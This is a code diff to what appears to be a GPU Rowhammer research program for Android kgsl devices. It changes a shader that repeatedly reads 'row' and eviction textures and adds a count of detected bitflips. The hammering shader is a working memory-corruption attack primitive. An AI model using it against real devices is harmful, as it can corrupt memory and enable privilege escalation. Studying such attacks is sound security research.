@@ -88,10 +88,10 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"	int id = int(threadD.x) % 10;\n"
 	"	id = id * 4096;\n"
 	"	for(int i = 0; i < 2000000; ++i){\n"
-	"		for(int j = 0; j < 64; ++j){\n"
-	"			FragColor = texelFetch(row1, ivec2(j * 16 % 32, j * int(16 / 32)), 0);\n"
-	"			FragColor = texelFetch(row2, ivec2(j * 16 % 32, j * int(16 / 32)), 0);\n"
-	"		}\n"
+	"		//for(int j = 0; j < 64; ++j){\n"
+	"		FragColor = texelFetch(row1, ivec2(0,0), 0);\n"
+	"		FragColor = texelFetch(row2, ivec2(0, 0), 0);\n"
+	"		//}\n"
 	"		FragColor = texelFetch(evict1, ivec2(id % 256, int(id / 256)), 0);\n"
 	"		FragColor = texelFetch(evict1, ivec2(id % 256 + 32, int(id / 256)), 0);\n"
 	"	}\n"
@@ -412,7 +412,7 @@ int main(){
 		exit(1);
 	}
 	glDeleteShader(fragmentShader);
-
+	int bitflips = 0;
 	for(size_t i = 0; i < cont_kgsls; ++i){
 		// preparing program to run
 		struct kgsl_entry* row1 = kgsl_result[i];
@@ -469,11 +469,12 @@ int main(){
 			for(int  i = 0; i < 32; ++i){
 				for( int j = 0; j < 32; ++j){
 					if(frame2[i * 32 + j] != 0xffffffff)
-						printf("FOUND BITFLIP %x\n", frame2[i * 32 + j]);
+						printf("FOUND BITFLIP %x on position %d\n", frame2[i * 32 + j], i * 32 + j, bitflips++);
 				//	else
 				//		printf("NO BITFLIP %x\n", frame2[i * 32 + j]);	
 				}
-			} 
+			}
+			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, 0, 0); 
 			free(frame2);
 			row1 = row1->kgsl_next;
 			row2 = row2->kgsl_next;
@@ -482,7 +483,7 @@ int main(){
 		
 		
 	}	
-	printf("RESULT NUMBER IS %u\n", cont_kgsls);
+	printf("RESULT NUMBER IS %u; bitflips %d\n", cont_kgsls, bitflips);
 	fclose(pagemap_csv);
 	fclose(kgsl_csv);
 	fclose(progout);
